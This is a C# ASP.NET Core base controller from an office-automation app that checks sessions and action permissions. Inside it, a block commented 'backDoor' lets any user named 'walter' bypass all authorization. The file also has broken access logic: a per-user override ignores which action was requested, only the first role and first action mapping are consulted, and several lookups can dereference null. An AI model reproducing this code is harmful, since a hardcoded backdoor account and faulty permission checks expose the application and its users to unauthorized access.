using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.Mvc.Filters;
using Microsoft.AspNetCore.Http;
using OA.Model;
using OA.IService;
using OA.Service;

// For more information on enabling MVC for empty projects, visit http://go.microsoft.com/fwlink/?LinkID=397860

namespace OA.UI.Controllers
{
    /// <summary>
    /// Class Description: each controller need to inherite this class to check session.
    /// </summary>
    public class BaseController : Controller
    {
        public String userId = String.Empty;
        public UserInfo userInfo;
        private IUserInfoService us = new UserInfoService();
        private IUserInfoRoleInfoService ur = new UserInfoRoleInfoService();
        private IActionInfoService a = new ActionInfoService();
        private IRoleInfoActionInfoService ra = new RoleInfoActionInfoService();
        private IRUserInfoActionInfoService rua = new RUserInfoActionInfoService();

        /// <summary>
        /// 
        /// </summary>
        /// <param name="context"></param>
        public override void OnActionExecuting(ActionExecutingContext context)
        {
            bool isExt = false;

            userId = HttpContext.Session.GetString("Uid");

            if (!String.IsNullOrEmpty(userId))
            {
                isExt = true;
                userInfo = us.GetList(u => u.Id == Convert.ToInt32(userId)).FirstOrDefault();

                // backDoor
                if (userInfo.Uname.ToLower() == "walter")
                {
                    return;
                }

                // normal permission verify.
                // get path of url.
                String requestUrl = Request.Path.ToString().ToLower();

                // get method.
                String requestHttpMethod = Request.Method.ToString().ToLower();

                // get action depend on url and httpMethod.
                var actionInfo = a.GetList(a => a.Url.ToLower() == requestUrl && a.HttpMethod.ToLower() == requestHttpMethod).FirstOrDefault();

                //
                if (actionInfo == null)
                {
                    Response.Redirect("/Error.html");
                    return;
                }

                // 1.
                var act = rua.GetList(r => r.UserInfoId == int.Parse(userId)).FirstOrDefault();
                if (act != null)
                {
                    if (act.IsPass == true)
                    {
                        // Pass
                        return;
                    }
                    else
                    {
                        Response.Redirect("/Error.html");
                        return;
                    }                 
                }


                // 2.
                var currentUserRoles = ur.GetList(u => u.UserInfoId == int.Parse(userId)).FirstOrDefault();
                var roleUserAction = ra.GetList(r => r.RoleInfoId == currentUserRoles.RoleInfoId).FirstOrDefault();
                var ac = a.GetList(a => a.Id == roleUserAction.ActionInfoId);
                var counter = (from a in ac
                              where a.Id == actionInfo.Id
                              select a).Count();
                if (counter < 1)
                {
                    Response.Redirect("/Error.html");
                }
            }

            // user did not log in.
            if (isExt == false)
            {
                HttpContext.Response.Redirect("/Login/Index/");
            }
        }
    }
}
